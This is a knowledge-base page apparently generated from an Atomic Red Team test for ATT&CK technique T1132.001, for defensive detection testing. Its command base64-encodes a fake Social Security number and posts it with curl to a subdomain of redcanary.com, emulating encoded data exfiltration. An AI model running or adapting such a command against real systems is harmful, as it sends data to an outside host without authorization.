---
atomic_guid: "2d97c626-7652-449e-a986-b02d9051c298"
title: "Base64 Encoded data (freebsd)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1132.001"
attack_technique_name: "Data Encoding: Standard Encoding"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "sh"
aliases:
  - "2d97c626-7652-449e-a986-b02d9051c298"
  - "Base64 Encoded data (freebsd)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Base64 Encoded data (freebsd)

Utilizing a common technique for posting base64 encoded data.

## Metadata

- Atomic GUID: 2d97c626-7652-449e-a986-b02d9051c298
- Technique: T1132.001: Data Encoding: Standard Encoding
- Platforms: linux
- Executor: sh
- Dependency Executor: sh
- Source Path: atomics/T1132.001/T1132.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1132-data_encoding|T1132.001]]

## Input Arguments

### base64_data

- description: Encoded data to post using fake Social Security number 111-11-1111.
- type: string
- default: MTExLTExLTExMTE=

### destination_url

- description: Destination URL to post encoded data.
- type: url
- default: redcanary.com

## Dependencies

Requires curl

### Prerequisite Check

```text
if [ -x "$(command -v curl)" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```text
pkg install -y curl
```

## Executor

- name: sh

### Command

```sh
echo -n 111-11-1111 | b64encode -r -
curl -XPOST #{base64_data}.#{destination_url}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml)
